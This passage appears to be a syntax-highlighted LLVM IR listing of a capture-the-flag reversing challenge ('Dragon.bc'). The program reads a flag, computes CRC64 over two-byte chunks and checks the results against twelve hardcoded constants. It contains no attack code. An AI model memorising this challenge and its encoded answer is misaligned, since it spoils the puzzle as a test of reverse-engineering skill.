class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line">; <span class="selector-tag">ModuleID</span> = &#x27;<span class="selector-tag">Dragon</span><span class="selector-class">.bc</span>&#x27;</span><br><span class="line"><span class="selector-tag">source_filename</span> = &quot;<span class="number">1</span><span class="selector-class">.cpp</span>&quot;</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">datalayout</span> = &quot;<span class="selector-tag">e-m</span>:<span class="selector-tag">w-p270</span>:<span class="number">32</span>:<span class="number">32</span><span class="selector-tag">-p271</span>:<span class="number">32</span>:<span class="number">32</span><span class="selector-tag">-p272</span>:<span class="number">64</span>:<span class="number">64</span><span class="selector-tag">-i64</span>:<span class="number">64</span><span class="selector-tag">-f80</span>:<span class="number">128</span><span class="selector-tag">-n8</span>:<span class="number">16</span>:<span class="number">32</span>:<span class="number">64</span><span class="selector-tag">-S128</span>&quot;</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">triple</span> = &quot;<span class="selector-tag">x86_64-pc-windows-msvc19</span><span class="selector-class">.39</span><span class="selector-class">.33522</span>&quot;</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">printf</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">scanf</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">_vfprintf_l</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">__local_stdio_printf_options</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">_vfscanf_l</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">__local_stdio_scanf_options</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_0O</span>@<span class="selector-tag">FIGNKBOM</span>@<span class="selector-tag">Input</span>?<span class="number">5</span><span class="selector-tag">U</span>?<span class="number">5</span><span class="selector-tag">flag</span>?<span class="number">3</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_02DKCKIIND</span>@?$<span class="selector-tag">CFs</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_06JPHCLLC</span>@<span class="selector-tag">Error</span>?$<span class="selector-tag">CB</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_07PBILKAFL</span>@<span class="selector-tag">Success</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_printf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_scanf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">@<span class="selector-tag">__const</span><span class="selector-class">.main</span><span class="selector-class">.enc</span> = <span class="selector-tag">private</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[12 x i64]</span> <span class="selector-attr">[i64 -2565957437423125689, i64 224890624719110086, i64 1357324823849588894, i64 -8941695979231947288, i64 -253413330424273460, i64 -7817463785137710741, i64 -5620500441869335673, i64 984060876288820705, i64 -6993555743080142153, i64 -7892488171899690683, i64 7190415315123037707, i64 -7218240302740981077]</span>, <span class="selector-tag">align</span> <span class="number">16</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_0O</span>@<span class="selector-tag">FIGNKBOM</span>@<span class="selector-tag">Input</span>?<span class="number">5</span><span class="selector-tag">U</span>?<span class="number">5</span><span class="selector-tag">flag</span>?<span class="number">3</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[14 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Input</span> <span class="selector-tag">U</span> <span class="selector-tag">flag</span>:\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_02DKCKIIND</span>@?$<span class="selector-tag">CFs</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[3 x i8]</span> <span class="selector-tag">c</span>&quot;%<span class="selector-tag">s</span>\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_06JPHCLLC</span>@<span class="selector-tag">Error</span>?$<span class="selector-tag">CB</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[7 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Error</span>!\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_07PBILKAFL</span>@<span class="selector-tag">Success</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[8 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Success</span>\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_printf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">global</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">@&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_scanf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">global</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i64</span> @&quot;?<span class="selector-tag">calculate_crc64_direct</span>@@<span class="selector-tag">YA_KPEBE_K</span>@<span class="selector-tag">Z</span>&quot;(ptr noundef %data, i64 noundef %length) <span class="selector-id">#0</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %length.addr = alloca i64, align 8</span><br><span class="line">  %data.addr = alloca ptr, align 8</span><br><span class="line">  %crc = alloca i64, align 8</span><br><span class="line">  %i = alloca i64, align 8</span><br><span class="line">  %j = alloca i64, align 8</span><br><span class="line">  store i64 %length, ptr %length.addr, align 8</span><br><span class="line">  store ptr %data, ptr %data.addr, align 8</span><br><span class="line">  store i64 -1, ptr %crc, align 8</span><br><span class="line">  store i64 0, ptr %i, align 8</span><br><span class="line">  br label %for.cond</span><br><span class="line"></span><br><span class="line">for.cond:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc7</span>, %<span class="selector-tag">entry</span></span><br><span class="line">  %<span class="number">0</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">1</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">length</span><span class="selector-class">.addr</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">0</span>, %<span class="number">1</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end9</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">2</span> = <span class="selector-tag">load</span> <span class="selector-tag">ptr</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span><span class="selector-class">.addr</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">3</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-tag">i8</span>, <span class="selector-tag">ptr</span> %<span class="number">2</span>, <span class="selector-tag">i64</span> %<span class="number">3</span></span><br><span class="line">  %<span class="number">4</span> = <span class="selector-tag">load</span> <span class="selector-tag">i8</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">arrayidx</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">conv</span> = <span class="selector-tag">zext</span> <span class="selector-tag">i8</span> %<span class="number">4</span> <span class="selector-tag">to</span> <span class="selector-tag">i64</span></span><br><span class="line">  %<span class="selector-tag">shl</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="selector-tag">conv</span>, <span class="number">56</span></span><br><span class="line">  %<span class="number">5</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">xor</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="number">5</span>, %<span class="selector-tag">shl</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.cond1</span>:                                        ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc</span>, %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  %<span class="number">6</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp2</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">6</span>, <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp2</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body3</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body3</span>:                                        ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line">  %<span class="number">7</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">and</span> = <span class="selector-tag">and</span> <span class="selector-tag">i64</span> %<span class="number">7</span>, <span class="selector-tag">-9223372036854775808</span></span><br><span class="line">  %<span class="selector-tag">tobool</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ne</span> <span class="selector-tag">i64</span> %<span class="selector-tag">and</span>, <span class="number">0</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">tobool</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.then</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.else</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.then</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body3</span></span><br><span class="line">  %<span class="number">8</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">shl4</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="number">8</span>, <span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">xor5</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="selector-tag">shl4</span>, <span class="number">4823603603198064275</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor5</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.else</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body3</span></span><br><span class="line">  %<span class="number">9</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">shl6</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="number">9</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">shl6</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.end</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.else</span>, %<span class="selector-tag">if</span><span class="selector-class">.then</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">10</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">10</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond1</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc7</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc7</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">11</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc8</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">11</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc8</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end9</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">12</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">xor10</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="number">12</span>, <span class="selector-tag">-1</span></span><br><span class="line">  <span class="selector-tag">ret</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">norecurse</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i32</span> @<span class="selector-tag">main</span>() <span class="selector-id">#1</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %retval = alloca i32, align 4</span><br><span class="line">  %enc = alloca [12 <span class="attribute">x i64], align 16</span></span><br><span class="line"><span class="attribute">  %data = alloca [66 x i8], align 16</span></span><br><span class="line"><span class="attribute">  %i = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  %j = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  %crc = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  store i32 0, ptr %retval, align 4</span></span><br><span class="line"><span class="attribute">  call void @llvm.memcpy.p0.p0.i64(ptr align 16 %enc, ptr align 16 @__const.main.enc, i64 96, i1 false)</span></span><br><span class="line"><span class="attribute">  call void @llvm.memset.p0.i64(ptr align 16 %data, i8 0, i64 66, i1 false)</span></span><br><span class="line"><span class="attribute">  %call = call i32 (ptr, ...) @printf(ptr noundef @&quot;??_C@_0O@FIGNKBOM@Input?5U?5flag?3?$AA@&quot;)</span></span><br><span class="line"><span class="attribute">  %arraydecay = getelementptr inbounds [66 x i8], ptr %data, i64 0, i64 0</span></span><br><span class="line"><span class="attribute">  %call1 = call i32 (ptr, ...) @scanf(ptr noundef @&quot;??_C@_02DKCKIIND@?$CFs?$AA@&quot;, ptr noundef %arraydecay)</span></span><br><span class="line"><span class="attribute">  store i64 0, ptr %i, align 8</span></span><br><span class="line"><span class="attribute">  store i64 0, ptr %j, align 8</span></span><br><span class="line"><span class="attribute">  br label %for.cond</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">for.cond</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc</span>, %<span class="selector-tag">entry</span></span><br><span class="line">  %<span class="number">0</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arraydecay2</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-attr">[66 x i8]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> <span class="number">0</span></span><br><span class="line">  %<span class="selector-tag">call3</span> = <span class="selector-tag">call</span> <span class="selector-tag">i64</span> @<span class="selector-tag">strlen</span>(ptr noundef %arraydecay2)</span><br><span class="line">  %<span class="selector-tag">div</span> = <span class="selector-tag">udiv</span> <span class="selector-tag">i64</span> %<span class="selector-tag">call3</span>, <span class="number">2</span></span><br><span class="line">  %<span class="selector-tag">cmp</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">0</span>, %<span class="selector-tag">div</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">1</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-attr">[66 x i8]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> %<span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">call4</span> = <span class="selector-tag">call</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i64</span> @&quot;?<span class="selector-tag">calculate_crc64_direct</span>@@<span class="selector-tag">YA_KPEBE_K</span>@<span class="selector-tag">Z</span>&quot;(ptr noundef %arrayidx, i64 noundef <span class="number">2</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">call4</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">2</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">3</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx5</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> 